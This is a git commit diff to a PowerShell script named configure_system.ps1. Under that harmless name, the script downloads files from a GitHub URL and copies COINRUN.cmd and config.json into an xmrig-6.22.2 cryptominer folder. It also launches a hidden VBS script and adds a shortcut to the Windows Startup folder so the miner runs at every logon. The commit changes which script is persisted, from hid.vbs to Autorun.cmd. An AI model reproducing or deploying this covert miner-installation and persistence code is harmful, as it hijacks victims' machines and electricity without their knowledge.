0b36c8463f76f961bf9b254de06b3c3aa218f88d
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-10 19:29:08 +0700

    configure_system.ps1

--- configure_system.ps1
+++ configure_system.ps1
@@ -10,8 +10,8 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/-/refs/heads/
 Copy-Item -Path 'C:\Users\Public\Downloads\COINRUN.cmd' -Destination 'C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd' -Force
 Copy-Item -Path 'C:\Users\Public\Downloads\config.json' -Destination 'C:\Users\Public\Downloads\xmrig-6.22.2\config.json' -Force
 Start-Process -FilePath 'C:\Users\Public\Downloads\hid.vbs'
-$source = "C:\Users\Public\Downloads\hid.vbs"
-$destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\hid.vbs.lnk"
+$source = "C:\Users\Public\Downloads\Autorun.cmd"
+$destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.cmd.lnk"
 $WshShell = New-Object -ComObject WScript.Shell
 $shortcut = $WshShell.CreateShortcut($destination)
 $shortcut.TargetPath = $source
